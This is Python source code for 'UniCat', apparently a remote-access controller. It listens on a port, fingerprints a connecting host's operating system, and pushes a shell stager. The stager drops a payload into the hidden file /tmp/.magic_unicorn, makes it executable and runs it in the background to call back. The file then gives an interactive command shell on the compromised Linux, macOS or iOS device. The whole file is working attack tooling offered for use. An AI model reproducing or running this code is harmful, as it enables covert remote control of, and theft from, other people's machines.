#!/usr/bin/env python3

import socket
import struct
import sys
import os
import pyaudio
import importlib

from time import sleep
from datetime import datetime

from core.handler import handler
from core.badges import badges

class UniCat:
    def __init__(self):
        self.badges = badges()

    def get_module(self, mu, name, folderpath):
        folderpath_list = folderpath.split(".")
        for i in dir(mu):
            if i == name:
                pass
                return getattr(mu, name)
            else:
                if i in folderpath_list:
                    i = getattr(mu, i)
                    return self.get_module(i, name, folderpath)

    def import_modules(self, path):
        modules = dict()
    
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                md = path.replace("/", ".").replace("\\", ".") + "." + mod[:-3]
                mt = __import__(md)
            
                m = self.get_module(mt, mod[:-3], md)
                m = m.UnicornModule(unicorn)
            
                modules[m.name] = m
        return modules

    def load_modules(self):
        global commands
        commands = self.import_modules("modules/" + target_system)

    def craft_payload(self, LHOST, LPORT, target_system):
        if target_system in ["Linux", "macOS", "iOS"]:
            print(self.badges.G + "Sending "+target_system+" payload...")
            if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
                f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
                payload = f.read()
                f.close()
                instructions = \
                "cat >/tmp/.magic_unicorn;"+\
                "chmod 777 /tmp/.magic_unicorn;"+\
                "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
                print(self.badges.G + "Executing "+target_system+" payload...")
                return (instructions, payload)
            else:
                print(self.badges.E +"Failed to craft "+target_system+" payload!")
                sys.exit()
        else:
            print(self.badges.E +"Unrecognized target system!")
            sys.exit()

    def help(self):
        pass

    def get_prompt_information(self):
        username = ['username']
        unicorn.send(str(username).encode("UTF-8"))
        username = unicorn.recv()
        hostname = ['hostname']
        unicorn.send(str(hostname).encode("UTF-8"))
        hostname = unicorn.recv()
        return (username.decode("UTF-8", "ignore"), hostname.decode("UTF-8", "ignore"))

    def shell(self):
        while True:
            try:
                username, hostname = self.get_prompt_information()
                command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
                while not command.strip():
                    command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
                command = command.strip()
                arguments = "".join(command.split(command.split(" ")[0])).strip()
                command = command.split(" ")
                if command[0] == "help":
                    self.help()
                elif command[0] == "exit":
                    print(self.badges.G + "Cleaning up...")
                    unicorn.send("exit".encode("UTF-8"))
                    c.close()
                    s.close()
                    sys.exit()
                elif command[0] == "exec":
                    if len(command) < 2:
                        print("Usage: exec <command>")
                    else:
                        print(self.badges.I + "exec:")
                        os.system(arguments)
                        print("")
                elif command[0] == "clear":
                    os.system("clear")
                else:
                    if command[0] in commands.keys():
                        if len(command) < int(commands[command[0]].args):
                            print(commands[command[0]].usage)
                        else:
                            commands[command[0]].run(arguments)
                    else:
                        print(self.badges.E + "Unrecognized command!")
            except (KeyboardInterrupt, EOFError):
                print("")
            except socket.error:
                print(self.badges.E +"Connection closed!")
                c.close()
                s.close()
                sys.exit()
            except UnicodeEncodeError:
                print(self.badges.E + "Failed to read command buffer!")
                print("")
            except Exception as e:
                print(self.badges.E +"An error occurred: "+str(e)+"!")

    def server(self, LHOST, LPORT, handler=handler):
        global s, a, c, target_system, unicorn
    
        print(self.badges.G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((LHOST, LPORT))
            s.listen(1)
        except:
            print(self.badges.E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
            try:
                s.close()
            except:
                pass
            sys.exit()

        try:
            print(self.badges.G + "Listening on port " + str(LPORT) + "...")
            c, a = s.accept()
            print(self.badges.G + "Connecting to " + a[0] + "...")

            c.send("uname -p\n".encode())
            device_arch = c.recv(128).decode().strip()
            c.send("uname -s\n".encode())
            device_os = c.recv(128).decode().strip()
        
            if device_os == "Linux":
                target_system = "Linux"
            elif device_os == "Darwin" and device_arch == "i386":
                target_system = "macOS"
            elif device_os == "Darwin" and device_arch in ["arm64", "armv7s", "arm"]:
                target_system = "iOS"
            else:
                target_system = "Unknown"
        
            bash_stager, executable = self.craft_payload(LHOST, LPORT, target_system)
        
            c.send(bash_stager.encode())
            c.send(executable)
            c.close()

            print(self.badges.G + "Establishing connection...")
            c, a = s.accept()

            unicorn = handler(c)
            self.load_modules()
            self.shell()
        except (KeyboardInterrupt, EOFError):
            print("")
            sys.exit()